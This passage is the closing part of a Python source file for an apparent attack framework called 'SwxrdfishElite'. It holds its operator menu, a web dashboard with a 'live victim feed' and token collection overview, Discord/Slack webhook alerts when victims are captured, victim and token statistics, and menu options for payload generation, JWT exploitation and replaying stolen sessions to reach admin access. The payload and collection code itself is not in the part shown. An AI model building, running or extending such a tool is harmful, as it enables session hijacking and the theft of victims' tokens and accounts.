        print(colored("="*75, 'green'))
        print(colored("SESSION REPLAY RESULTS", 'green', attrs=['bold']))
        print(colored("="*75, 'green'))
        print()
        
        if 'error' in results:
            print(colored(f"Error: {results['error']}", 'red'))
        else:
            if results['authenticated']:
                print(colored("AUTHENTICATED SESSION", 'green', attrs=['bold']))
            else:
                print(colored("Session not authenticated", 'red'))
            
            if results['admin_access']:
                print(colored("CRITICAL: ADMIN ACCESS ACHIEVED", 'red', attrs=['bold']))
            
            if results['indicators']:
                print(colored("\nDetected Indicators:", 'cyan'))
                for indicator in results['indicators']:
                    print(colored(f"  - {indicator}", 'yellow'))
            
            if 'screenshot' in results:
                print(colored(f"\nScreenshot saved: {results['screenshot']}", 'green'))
        
        print()
        input(colored("Press Enter to continue...", 'yellow'))
    
    def start_web_dashboard(self):
        if not FLASK_AVAILABLE:
            self.logger.error("Flask not installed. Install with: pip install flask")
            print()
            input(colored("Press Enter to continue...", 'yellow'))
            return
        
        self.logger.info("Starting web dashboard...")
        
        global dashboard_db
        dashboard_db = self.database
        
        if not self.dashboard_thread or not self.dashboard_thread.is_alive():
            self.dashboard_thread = threading.Thread(
                target=lambda: dashboard_app.run(
                    host='0.0.0.0',
                    port=self.dashboard_port,
                    debug=False,
                    use_reloader=False
                ),
                daemon=True
            )
            self.dashboard_thread.start()
            time.sleep(1)
        
        print()
        print(colored("WEB DASHBOARD STARTED", 'green', attrs=['bold']))
        print()
        print(colored(f"Access dashboard at:", 'cyan'))
        print(colored(f"   http://localhost:{self.dashboard_port}", 'yellow', attrs=['bold']))
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            print(colored(f"   http://{local_ip}:{self.dashboard_port}", 'yellow'))
        except Exception:
            pass
        
        print()
        print(colored("Features:", 'cyan'))
        print(colored("   - Live victim feed (auto-refresh every 10 seconds)", 'white'))
        print(colored("   - Statistics dashboard", 'white'))
        print(colored("   - Token collection overview", 'white'))
        print()
        
        input(colored("Press Enter to continue...", 'yellow'))
    
    def configure_webhooks(self):
        print(colored("\nWEBHOOK CONFIGURATION", 'cyan', attrs=['bold']))
        print()
        print(colored("Webhooks send real-time notifications when victims are captured", 'white'))
        print()
        print(colored("Supported:", 'yellow'))
        print(colored("  - Discord (https://discord.com/api/webhooks/...)", 'white'))
        print(colored("  - Slack (https://hooks.slack.com/services/...)", 'white'))
        print()
        
        webhook_url = input(colored("[?] Enter webhook URL (or press Enter to disable): ", 'cyan')).strip()
        
        if webhook_url:
            self.webhook_url = webhook_url
            CollectorServer.webhook_url = webhook_url
            self.config.set('webhook', 'url', value=webhook_url)
            self.config.set('webhook', 'enabled', value=True)
            self.logger.success("Webhook notifications enabled")
        else:
            self.webhook_url = None
            CollectorServer.webhook_url = None
            self.config.set('webhook', 'enabled', value=False)
            self.logger.info("Webhook notifications disabled")
        
        print()
        input(colored("Press Enter to continue...", 'yellow'))
    
    def show_stats(self):
        stats = self.database.get_stats()
        
        print(colored("\n" + "="*50, 'cyan'))
        print(colored("           DATABASE STATISTICS                  ", 'cyan', attrs=['bold']))
        print(colored("="*50 + "\n", 'cyan'))
        
        print(colored(f"  Total Victims: {stats['total_victims']}", 'green'))
        print(colored(f"  Total Tokens: {stats['total_tokens']}", 'yellow'))
        
        if self.callback_url:
            print(colored(f"\n  Callback URL: {self.callback_url}", 'cyan'))
        
        if self.webhook_url:
            print(colored(f"  Webhooks: ENABLED", 'green'))
        
        print()
        input(colored("Press Enter to continue...", 'yellow'))
    
    def toggle_beginner_mode(self):
        self.beginner_mode = not self.beginner_mode
        
        if self.beginner_mode:
            print(colored("\nBEGINNER MODE ACTIVATED", 'green', attrs=['bold']))
        else:
            print(colored("\nBEGINNER MODE DEACTIVATED", 'red', attrs=['bold']))
        
        print()
        input(colored("Press Enter to continue...", 'yellow'))
    
    def cleanup(self):
        """Cleanup resources on shutdown"""
        self.running = False
        self.logger.info("Cleaning up resources...")
        
        if self.server:
            try:
                self.server.shutdown()
                self.logger.info("Server stopped")
            except Exception as e:
                self.logger.error(f"Error stopping server: {e}")
        
        if self.tunnel_manager:
            self.tunnel_manager.stop()
        
        self.logger.info("Shutdown complete")
    
    def start(self):
        try:
            self.show_banner()
            
            mode = input(colored("[?] Enable beginner mode? (y/n): ", 'yellow')).strip().lower()
            if mode == 'y':
                self.beginner_mode = True
            
            while self.running:
                self.show_banner()
                self.show_menu()
                
                choice = input(colored("\n[>] Select option: ", 'cyan')).strip()
                
                if choice == '1':
                    self.start_server_with_tunnel()
                elif choice == '2':
                    self.generate_advanced_payloads()
                elif choice == '3':
                    self.view_victims_enhanced()
                elif choice == '4':
                    self.jwt_exploitation()
                elif choice == '5':
                    self.session_replay_menu()
                elif choice == '6':
                    self.start_web_dashboard()
                elif choice == '7':
                    self.configure_webhooks()
                elif choice == '8':
                    self.show_stats()
                elif choice == '9':
                    self.toggle_beginner_mode()
                elif choice == '0':
                    self.logger.info("Shutting down...")
                    break
                else:
                    self.logger.error("Invalid option")
                    time.sleep(1)
        finally:
            self.cleanup()


def main():
    try:
        swxrdfish = SwxrdfishElite()
        swxrdfish.start()
    except KeyboardInterrupt:
        print(colored("\n\nTerminated by user", 'red'))
    except Exception as e:
        print(colored(f"\nError: {str(e)}", 'red'))
        logging.exception("Fatal error")


if __name__ == "__main__":
    main()
